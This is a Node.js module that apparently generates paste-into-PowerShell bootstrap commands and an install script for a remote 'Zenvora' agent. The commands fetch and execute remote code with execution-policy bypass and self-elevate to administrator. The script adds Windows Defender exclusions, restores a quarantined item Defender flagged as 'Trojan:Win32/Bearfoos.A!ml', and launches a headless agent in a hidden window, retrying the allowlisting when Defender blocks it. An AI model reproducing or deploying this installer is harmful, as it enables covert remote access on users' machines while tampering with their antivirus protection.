

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

/** @type {Map<string, object>} */
const tickets = new Map();

const TTL_MS = 4 * 60 * 60 * 1000; // 4 hours — reinstalls across slow PCs
const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
const STORE_FILE = path.join(
    process.env.TMPDIR || process.env.TEMP || '/tmp',
    'zenvora-bootstrap-tickets.json'
);

function makeCode(len = 6) {
    const bytes = crypto.randomBytes(len);
    let out = '';
    for (let i = 0; i < len; i += 1) {
        out += CODE_ALPHABET[bytes[i] % CODE_ALPHABET.length];
    }
    return out;
}

function purgeExpired() {
    const now = Date.now();
    for (const [code, t] of tickets.entries()) {
        if (t.expiresAt <= now) tickets.delete(code);
    }
}

function loadDiskStore() {
    try {
        if (!fs.existsSync(STORE_FILE)) return;
        const raw = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
        const now = Date.now();
        for (const [code, t] of Object.entries(raw || {})) {
            if (t && t.expiresAt > now) tickets.set(String(code).toUpperCase(), t);
        }
    } catch {
        /* ignore corrupt store */
    }
}

function saveDiskStore() {
    try {
        purgeExpired();
        const obj = Object.fromEntries(tickets.entries());
        fs.writeFileSync(STORE_FILE, JSON.stringify(obj), 'utf8');
    } catch {
        /* ignore */
    }
}

loadDiskStore();

function createTicket(payload) {
    purgeExpired();
    let code = makeCode(6);
    for (let i = 0; i < 8 && tickets.has(code); i += 1) {
        code = makeCode(6);
    }

    const ticket = {
        code,
        userId: String(payload.userId || ''),
        pairingToken: String(payload.pairingToken || ''),
        pairingUserId: String(payload.pairingUserId || ''),
        sessionId: String(payload.sessionId || `web-${Date.now().toString(36)}`),
        apiBase: String(payload.apiBase || '').replace(/\/$/, ''),
        gatewayUrl: String(payload.gatewayUrl || ''),
        downloadUrl: String(payload.downloadUrl || ''),
        createdAt: Date.now(),
        expiresAt: Date.now() + TTL_MS,
    };

    tickets.set(code, ticket);
    saveDiskStore();
    return ticket;
}

function getTicket(code) {
    purgeExpired();
    const key = String(code || '').trim().toUpperCase();
    let ticket = tickets.get(key);
    if (!ticket) {
        loadDiskStore();
        ticket = tickets.get(key);
    }
    if (!ticket) return null;
    if (ticket.expiresAt <= Date.now()) {
        tickets.delete(key);
        saveDiskStore();
        return null;
    }
    return ticket;
}

/**
 * Paste into Admin PowerShell (recommended).
 * Multi-fallback fetch: curl -4, curl, Invoke-WebRequest, WebClient.
 * Exit 28 is usually IPv6/firewall — force IPv4 first.
 */
function buildBootstrapCommand(apiBase, code) {
    const base = String(apiBase || '').replace(/\/$/, '');
    const url = `${base}/r/${String(code).toUpperCase()}`;
    return [
        "Write-Host 'Zenvora: fetching install script...' -ForegroundColor Cyan;",
        "$ProgressPreference='SilentlyContinue';",
        '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;',
        "try { [Net.ServicePointManager]::Expect100Continue = $false } catch {};",
        `$__url = '${url}';`,
        '$__zv = $null;',
        'if (Get-Command curl.exe -ErrorAction SilentlyContinue) {',
        '  Write-Host "Trying curl IPv4..." -ForegroundColor DarkCyan;',
        '  $__zv = & curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 --retry 2 --retry-delay 2 $__url 2>$null;',
        '  if ($LASTEXITCODE -ne 0) { Write-Host "curl -4 failed (exit $LASTEXITCODE)" -ForegroundColor Yellow; $__zv = $null }',
        '};',
        'if ([string]::IsNullOrWhiteSpace($__zv) -and (Get-Command curl.exe -ErrorAction SilentlyContinue)) {',
        '  Write-Host "Trying curl..." -ForegroundColor DarkCyan;',
        '  $__zv = & curl.exe -fsSL --connect-timeout 45 --max-time 120 --retry 2 --retry-delay 2 $__url 2>$null;',
        '  if ($LASTEXITCODE -ne 0) { Write-Host "curl failed (exit $LASTEXITCODE)" -ForegroundColor Yellow; $__zv = $null }',
        '};',
        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
        '  Write-Host "Trying Invoke-WebRequest..." -ForegroundColor DarkCyan;',
        '  try { $__zv = (Invoke-WebRequest -Uri $__url -UseBasicParsing -TimeoutSec 90).Content } catch { Write-Host ("IWR failed: " + $_.Exception.Message) -ForegroundColor Yellow; $__zv = $null }',
        '};',
        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
        '  Write-Host "Trying WebClient..." -ForegroundColor DarkCyan;',
        '  try { $__zv = (New-Object Net.WebClient).DownloadString($__url) } catch { Write-Host ("WebClient failed: " + $_.Exception.Message) -ForegroundColor Yellow; $__zv = $null }',
        '};',
        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
        '  Write-Host "Fetch failed — this PC cannot reach the server." -ForegroundColor Red;',
        '  Write-Host "Open this URL in the SAME PC browser:" -ForegroundColor Yellow;',
        '  Write-Host $__url -ForegroundColor Yellow;',
        '  Write-Host "Also try: https://zenvora.abdullahtahir.me/api/health" -ForegroundColor Yellow;',
        '  Write-Host "If browser also fails: DNS/firewall/ISP — try mobile hotspot." -ForegroundColor Yellow;',
        '  return',
        '};',
        'Write-Host "Zenvora: running installer..." -ForegroundColor Cyan;',
        'Invoke-Expression $__zv',
    ].join(' ');
}

/** From cmd.exe / Run dialog. */
function buildBootstrapCommandCmd(apiBase, code) {
    const base = String(apiBase || '').replace(/\/$/, '');
    const url = `${base}/r/${String(code).toUpperCase()}`;
    const inner =
        `Write-Host ''Zenvora: fetching...'' -ForegroundColor Cyan;` +
        `$ProgressPreference=''SilentlyContinue'';` +
        `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
        `$__url=''${url}'';` +
        `$__zv=$null;` +
        `if (Get-Command curl.exe -EA SilentlyContinue) { $__zv = curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 $__url 2>$null };` +
        `if ([string]::IsNullOrWhiteSpace($__zv)) { try { $__zv = (New-Object Net.WebClient).DownloadString($__url) } catch {} };` +
        `if ([string]::IsNullOrWhiteSpace($__zv)) { Write-Host ''Fetch failed'' -ForegroundColor Red; return };` +
        `Invoke-Expression $__zv`;
    return `powershell -NoP -Ep Bypass -c '${inner}'`;
}

/** Win10+ curl one-liner (cmd). Force IPv4. */
function buildBootstrapCommandCurl(apiBase, code) {
    const base = String(apiBase || '').replace(/\/$/, '');
    const url = `${base}/r/${String(code).toUpperCase()}`;
    return `curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 --retry 2 "${url}" | powershell -NoP -Ep Bypass -`;
}

/**
 * Full install script — Win7/8/10/11 tolerant.
 */
function buildInstallScript(ticket) {
    const token = ticket.pairingToken.replace(/'/g, "''");
    const userId = ticket.pairingUserId.replace(/'/g, "''");
    const api = ticket.apiBase.replace(/'/g, "''");
    const gw = ticket.gatewayUrl.replace(/'/g, "''");
    const url = ticket.downloadUrl.replace(/'/g, "''");
    const session = ticket.sessionId.replace(/'/g, "''");
    const code = ticket.code;
    const scriptUrl = `${ticket.apiBase.replace(/'/g, "''")}/r/${code}`;

    return [
        "Write-Host 'Zenvora bootstrap starting...' -ForegroundColor Cyan",
        "try {",
        "$ErrorActionPreference = 'Stop'",
        "$ProgressPreference = 'SilentlyContinue'",
        "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {} }",
        "try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}",
        "try { [Net.ServicePointManager]::DefaultConnectionLimit = 16 } catch {}",
        `$code = '${code}'`,
        `$token = '${token}'`,
        `$userId = '${userId}'`,
        `$api = '${api}'`,
        `$gw = '${gw}'`,
        `$url = '${url}'`,
        `$session = '${session}'`,
        `$scriptUrl = '${scriptUrl}'`,
        "$dir = Join-Path $env:ProgramData 'Zenvora'",
        "$out = Join-Path $dir 'ZenvoraAgent.exe'",
        "$legacyDir = Join-Path $env:ProgramData 'WIN_32'",
        "$mpCmd = Join-Path $env:ProgramFiles 'Windows Defender\\MpCmdRun.exe'",
        "function Step($n,$t,$m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] ['+$n+'/'+$t+'] '+$m) -ForegroundColor Cyan }",
        "function Ok($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Green }",
        "function Warn($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Yellow }",
        "function Fail($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Red }",
        "function Get-WinLabel {",
        "  try {",
        "    $v = [Environment]::OSVersion.Version",
        "    if ($v.Major -ge 10) { return 'Win10/11' }",
        "    if ($v.Major -eq 6 -and $v.Minor -ge 2) { return 'Win8/8.1' }",
        "    if ($v.Major -eq 6 -and $v.Minor -eq 1) { return 'Win7' }",
        "    return ('Win ' + $v.Major + '.' + $v.Minor)",
        "  } catch { return 'Windows' }",
        "}",
        "function Ensure-Admin {",
        "  $p = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()",
        "  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { return $true }",
        "  Warn 'Elevating to Administrator...'",
        "  $ps = Join-Path $env:WINDIR 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'",
        "  $inner = ('$ProgressPreference=''SilentlyContinue'';[Net.ServicePointManager]::SecurityProtocol=3072;iex ((New-Object Net.WebClient).DownloadString(''' + $scriptUrl + '''))')",
        "  Start-Process -FilePath $ps -Verb RunAs -ArgumentList @('-NoP','-Ep','Bypass','-c', $inner) | Out-Null",
        "  Ok 'Elevated install started in a new Admin window.'",
        "  return $false",
        "}",
        "function Allow-ZenvoraInDefender {",
        "  try {",
        "    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
        "      Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
        "      Add-MpPreference -ExclusionPath $legacyDir -ErrorAction SilentlyContinue",
        "      Add-MpPreference -ExclusionProcess 'ZenvoraAgent.exe' -ErrorAction SilentlyContinue",
        "      Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
        "    }",
        "  } catch { Warn ('Defender exclude skip: ' + $_.Exception.Message) }",
        "  try {",
        "    if (Test-Path $mpCmd) {",
        "      & $mpCmd -AddExclusion -ExclusionType Folder -ExclusionPath $dir 2>$null | Out-Null",
        "      & $mpCmd -Restore -Name 'Trojan:Win32/Bearfoos.A!ml' -All 2>$null | Out-Null",
        "    }",
        "  } catch {}",
        "}",
        "function Download-Agent($dest) {",
        "  $tmp = $dest + '.part'",
        "  if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }",
        "  $curl = Get-Command curl.exe -ErrorAction SilentlyContinue",
        "  $okDl = $false",
        "  if ($curl) {",
        "    Write-Host 'Download via curl IPv4...' -ForegroundColor DarkCyan",
        "    & curl.exe -4 -L --fail --retry 3 --retry-delay 2 --connect-timeout 45 --max-time 300 -A 'ZenvoraBootstrap/2.0' -o $tmp $url",
        "    if ($LASTEXITCODE -eq 0) { $okDl = $true } else { Warn ('curl -4 exit ' + $LASTEXITCODE) }",
        "  }",
        "  if (-not $okDl -and $curl) {",
        "    Write-Host 'Download via curl...' -ForegroundColor DarkCyan",
        "    & curl.exe -L --fail --retry 3 --retry-delay 2 --connect-timeout 45 --max-time 300 -A 'ZenvoraBootstrap/2.0' -o $tmp $url",
        "    if ($LASTEXITCODE -eq 0) { $okDl = $true } else { Warn ('curl exit ' + $LASTEXITCODE) }",
        "  }",
        "  if (-not $okDl) {",
        "    Write-Host 'Download via WebRequest...' -ForegroundColor DarkCyan",
        "    $req = [Net.HttpWebRequest]::Create($url)",
        "    $req.Method = 'GET'",
        "    $req.UserAgent = 'ZenvoraBootstrap/2.0'",
        "    $req.Timeout = 300000",
        "    $req.ReadWriteTimeout = 300000",
        "    $req.KeepAlive = $false",
        "    $resp = $req.GetResponse()",
        "    try {",
        "      $src = $resp.GetResponseStream()",
        "      $fs = [IO.File]::Create($tmp)",
        "      try {",
        "        $buf = New-Object byte[] 65536",
        "        while (($n = $src.Read($buf, 0, $buf.Length)) -gt 0) { $fs.Write($buf, 0, $n) }",
        "      } finally { $fs.Close() }",
        "    } finally { $resp.Close() }",
        "    $okDl = $true",
        "  }",
        "  if (-not (Test-Path $tmp) -or ((Get-Item $tmp).Length -lt 500000)) { throw 'Downloaded file too small or missing' }",
        "  Move-Item -Force $tmp $dest",
        "}",
        "Step 1 7 ('Bootstrap ' + $code + ' on ' + (Get-WinLabel))",
        "if (-not (Ensure-Admin)) { return }",
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
        "Step 2 7 'Allowlisting Zenvora in Defender (skip OK on older Windows)...'",
        "Allow-ZenvoraInDefender",
        "Ok ('Install folder: ' + $dir)",
        "Step 3 7 'Downloading agent (timeout-safe)...'",
        "if (Test-Path $out) {",
        "  try { Stop-Process -Name 'ZenvoraAgent','win_32' -Force -ErrorAction SilentlyContinue } catch {}",
        "  Start-Sleep -Milliseconds 400",
        "  Remove-Item $out -Force -ErrorAction SilentlyContinue",
        "}",
        "$ok = $false",
        "for ($i=1; $i -le 5 -and -not $ok; $i++) {",
        "  try {",
        "    Download-Agent $out",
        "    $ok = $true",
        "  } catch {",
        "    Warn ('Download attempt ' + $i + ' failed: ' + $_.Exception.Message)",
        "    if (Test-Path ($out + '.part')) { Remove-Item ($out + '.part') -Force -ErrorAction SilentlyContinue }",
        "    if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }",
        "    Allow-ZenvoraInDefender",
        "    if ($i -lt 5) { Start-Sleep -Seconds (3 * $i) }",
        "  }",
        "}",
        "if (-not $ok) { throw 'Download failed after retries. Check network /api/agent/download.' }",
        "try { Unblock-File -Path $out -ErrorAction SilentlyContinue } catch {}",
        "Allow-ZenvoraInDefender",
        "Ok ('Download OK (' + ((Get-Item $out).Length) + ' bytes)')",
        "Step 4 7 'Removing legacy malware-like paths (WIN_32 / System32)...'",
        "foreach ($legacy in @(",
        "  (Join-Path $legacyDir 'win_32.exe'),",
        "  (Join-Path $env:WINDIR 'System32\\win_32.exe'),",
        "  (Join-Path $env:WINDIR 'System32\\ZenvoraAgent.exe')",
        ")) {",
        "  if (Test-Path $legacy) { try { Remove-Item $legacy -Force -ErrorAction SilentlyContinue; Warn ('Removed ' + $legacy) } catch {} }",
        "}",
        "if ((Test-Path (Join-Path $legacyDir 'agent.dat')) -and -not (Test-Path (Join-Path $dir 'agent.dat'))) {",
        "  Copy-Item (Join-Path $legacyDir 'agent.dat') (Join-Path $dir 'agent.dat') -Force -ErrorAction SilentlyContinue",
        "}",
        "Step 5 7 'Launching agent provision (pair + connect)...'",
        "$launchArgs = @('--headless','--force-repair','--pair-token',$token,'--pair-user-id',$userId,'--api-url',$api,'--gateway-url',$gw,'--install-session',$session)",
        "try {",
        "  Start-Process -FilePath $out -ArgumentList $launchArgs -WindowStyle Hidden",
        "} catch {",
        "  $msg = $_.Exception.Message",
        "  if ($msg -match 'virus|unwanted|smartscreen|blocked|Operation did not complete') {",
        "    Fail 'Defender blocked launch — refreshing allowlist...'",
        "    Allow-ZenvoraInDefender",
        "    Start-Sleep -Seconds 2",
        "    Start-Process -FilePath $out -ArgumentList $launchArgs -WindowStyle Hidden",
        "    Ok 'Launch succeeded after allowlist'",
        "  } else { throw }",
        "}",
        "Start-Sleep -Milliseconds 600",
        "Step 6 7 'Agent started — wait for Dashboard online status'",
        "Ok 'Done. Keep Pair Device modal open for live logs.'",
        "Step 7 7 'Complete'",
        "} catch {",
        "  Fail ('Bootstrap failed: ' + $_.Exception.Message)",
        "  Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed",
        "  throw",
        "}",
    ].join("\r\n");
}

module.exports = {
    createTicket,
    getTicket,
    buildInstallScript,
    buildBootstrapCommand,
    buildBootstrapCommandCurl,
    buildBootstrapCommandCmd,
};
